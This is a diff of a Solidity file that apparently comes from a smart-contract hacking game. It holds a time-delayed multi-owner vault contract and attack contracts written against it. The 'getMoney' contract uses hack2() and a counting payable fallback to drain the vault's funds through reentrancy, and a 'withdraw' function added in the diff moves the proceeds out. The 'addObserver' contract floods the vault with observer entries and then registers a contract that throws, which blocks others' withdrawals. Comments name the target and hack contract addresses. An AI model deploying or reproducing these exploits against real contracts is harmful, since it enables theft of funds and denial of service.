@@ -1,8 +1,5 @@
 pragma solidity ^0.4.17;
-//老董最新合约：0x0e3e24d6f30cd710599d75e7e0d5448d74ae4bdb
-//Hack合约：0xe359bdc5c9d7f39ccbe26a9a2ca5e0b9091e0c46
-//observe:0x97ddbd0ade30554e05e7b4545db3188b62696178
-//一个测试的老董合约：0x2b44b4ab8f15dc9d77f14a9daf6bb797ecce1cb3
+
 contract BasicMultiOwnerVault {
     address[] public authorizedUsers;
     address public owner;
@@ -147,13 +144,14 @@ contract TimeDelayedVault is BasicMultiOwnerVault {
 }
 
 
-contract getMoney{
-    address public ct_addr = 0x2b44b4ab8f15dc9d77f14a9daf6bb797ecce1cb3;
+
+contract getMoney{ //0x202a08c0b2cf36c94458f85c36914aa50f98bd71
+    address public ct_addr = 0x0e3e24d6f30cd710599d75e7e0d5448d74ae4bdb;
     uint public count = 0;
     uint public limit = 1;
     uint public gaslimit = 30000000;
     address public ownerLALALA;
-    TimeDelayedVault ct = TimeDelayedVault(ct_addr);
+    TimeDelayedVault ct ;
     
     modifier onlyOwner() {
         require(msg.sender == ownerLALALA);
@@ -167,6 +165,7 @@ contract getMoney{
     }
     function setTarget(address _addr) onlyOwner{
         ct_addr = _addr;
+        ct = TimeDelayedVault(ct_addr);
     }
     function addObserver() onlyOwner{
        ct.setObserver(this);    
@@ -178,9 +177,11 @@ contract getMoney{
     function hack2() onlyOwner{ // need checkObserver first
          ct.setObserver(this);
          count += 1;
-
          ct.withdrawFund(this);
     }    
+    function withdraw(address addr, uint amount) onlyOwner{
+        addr.transfer(amount * 1 ether);
+    }
     function () payable {
         if(count<limit ){
             count += 1;
@@ -203,9 +204,68 @@ contract getMoney{
     
 }
 
-
+//test Observer;
+//assert(withdrawObserver.call(bytes4(sha3("observe()"))));
+contract test{  //not throw error  0x699e475855cd3511d7a3ea222a070febb4fe6b53
+    function () {
+    }
+}
 contract test2{//not throw error 0x97ddbd0ade30554e05e7b4545db3188b62696178
     function observe() returns (bool){
         return true;
     }
+}
+contract test3{//throw error //blockchain 0xba0e8d1f9673bd836e2c88e22b773caac57c356f
+}
+
+//add many observers to other group 
+contract addObserver{ //blockchain 0xda8a05f20f474b28e937c003dc6c0c09bb54017b
+    address public target;
+    address public badContract = 0xba0e8d1f9673bd836e2c88e22b773caac57c356f;
+    uint public loopLimit = 1;
+    uint public offset = 0;
+    address public ownerLALALA;
+    
+    modifier onlyOwner() {
+        require(msg.sender == ownerLALALA);
+        _;
+    }
+    function addObserver() onlyOwner{
+        ownerLALALA = msg.sender;
+    }
+    function setTarget(address _target) onlyOwner{
+        target = _target;
+    }
+    function setLimit(uint _limit) onlyOwner{
+        loopLimit = _limit;
+    }
+    function setOffset(uint _offset) onlyOwner{
+        offset = _offset;
+    }
+    function setBadContract(address _addr) onlyOwner{
+        badContract = _addr;
+    }
+    function addManyOb() onlyOwner {
+        TimeDelayedVault ct = TimeDelayedVault(target);
+
+        for(uint i=1;i<=loopLimit;i++){
+            ct.setObserver(address(i+offset));    
+        }
+        offset += loopLimit;
+    }
+    function addLastOb() onlyOwner{// add a bad address 
+        TimeDelayedVault ct = TimeDelayedVault(target);
+        ct.setObserver(badContract);    
+    }
+    function reset() onlyOwner{
+        target = 0x0;
+        loopLimit = 1;
+        offset = 0;
+    }
+}
+
+contract testObsever{
+    address withdrawObserver ;//= 0x0;
+    function test(){
+    assert(withdrawObserver.call(bytes4(sha3("observe()"))));    }
 }
